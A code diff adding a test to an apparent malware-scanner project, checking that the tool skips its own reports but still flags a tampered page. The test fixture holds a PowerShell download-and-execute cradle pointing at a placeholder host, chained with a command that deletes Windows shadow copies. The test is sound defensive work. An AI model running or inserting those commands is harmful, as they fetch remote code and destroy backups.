@@ -342,3 +342,26 @@ def test_cli_scan_fix_and_report(tmp_path, eicar_bytes, capsys):
     assert main(["scan", "--path", str(tmp_path), "-q", "--json"]) == 0
     assert main(["info", "--json"]) == 0
     assert main([]) == 0
+
+
+def test_own_reports_are_not_flagged_but_tampered_ones_are(ctx, tmp_path):
+    from aegis.core.report import write_report
+    from aegis.scanners.files import scan_file
+
+    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://x/a') ; vssadmin delete shadows /all /quiet"
+    r = ScanResult(profile="quick")
+    r.add(Finding("AEG-HEUR", "Suspicious script", Severity.HIGH, "suspicious", location="c:/x.ps1",
+                  evidence={"matched": cradle}))
+    for ext in ("html", "json", "csv"):
+        p = write_report(r, tmp_path / f"report.{ext}")
+        assert scan_file(ctx, p) == [], ext
+    assert ctx.stats["aegis_reports_skipped"] == 3
+    # Copying the generator marker into a malicious page must not buy a free pass.
+    evil = tmp_path / "phish.html"
+    evil.write_text('<meta name="generator" content="Aegis Security Suite"><script>' + cradle + "</script>")
+    plain = tmp_path / "plain.ps1"
+    plain.write_text(cradle)
+    assert scan_file(ctx, plain)
+    assert ctx.stats["aegis_reports_skipped"] == 3
+    scan_file(ctx, evil)
+    assert ctx.stats["aegis_reports_skipped"] == 3
